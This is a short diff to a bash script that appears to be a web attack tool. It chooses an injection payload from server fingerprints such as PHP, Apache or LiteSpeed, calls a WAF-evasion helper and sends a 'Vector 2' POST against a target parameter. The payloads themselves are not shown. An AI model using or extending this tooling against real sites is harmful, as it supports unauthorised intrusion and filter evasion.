@@ -187,7 +187,7 @@ fi
         local clean_target_url="${target_url%%\?*}"
 local active_payload=""
           if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
-            active_payload="$query_payload"
+            active_payload="$t4"
           else
      active_payload="$defiance_tamper_path"
           fi
@@ -291,6 +291,12 @@ fi
             fi
             local waf_trick=$(braindamage)
         local clean_target_url="${target_url%%\?*}"
+if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
+    active_payload="$t4"
+else
+    active_payload="$defiance_tamper_path"
+fi
+
           if [ "$REQ_METHOD" = "POST" ]; then
             
             echo -e "\e[0;34m[\e[0m>\e[0;34m]\e[0m Vector 2 [POST][PORT:$random_port] Target Param: $TARGET_PARAM"
